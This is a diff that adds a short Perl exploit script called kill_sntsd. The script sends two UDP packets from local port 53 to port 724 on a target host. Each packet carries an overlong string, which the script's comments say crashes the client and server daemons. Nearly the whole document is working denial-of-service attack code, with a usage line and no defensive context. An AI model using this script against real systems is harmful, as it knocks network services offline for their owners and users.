@@ -1,0 +1,30 @@
+#!/usr/bin/perl -w
+#
+# Usage: ./kill_sntsd <hostname>
+#
+
+use Socket;
+
+send_packet(); # Needs to send 2 packets to kill the client and the server 
+daemons
+send_packet();
+
+sub send_packet {
+
+$proto = getprotobyname('udp');
+$localaddr = gethostbyname("localhost") || die "error: $!\n";
+$iaddr = gethostbyname($ARGV[0]) || die "$!\n";
+$sin = sockaddr_in(724, $iaddr);
+$paddr = sockaddr_in(53, $localaddr);
+socket(SH, PF_INET, SOCK_DGRAM, $proto);
+bind(SH, $paddr);
+
+$|=1;
+
+connect(SH, $sin) || die "$!\n";
+
+# A string longer than 50 characters...
+print SH "logistixlogistixlogistixlogistixlogistixlogistixlogistix\n";
+close(SH);
+
+}
